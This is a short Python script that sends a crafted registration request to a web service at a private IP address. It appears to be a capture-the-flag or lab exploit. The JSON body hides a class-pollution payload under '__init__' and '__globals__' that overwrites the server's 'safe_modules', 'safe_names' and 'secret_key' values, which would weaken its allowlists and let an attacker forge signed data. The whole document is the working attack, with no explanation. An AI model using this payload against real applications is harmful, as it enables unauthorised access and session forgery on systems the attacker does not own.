import requests
import json

register_url = "http://172.27.72.43:8080/register"

data = {"username":"zzzz","password":"zzz", "__init__" : {"__globals__" : {"safe_modules":["123"],"safe_names":["123456"],"secret_key":"123456"}}}

response = requests.post(register_url, json=data) 
print(response.text)


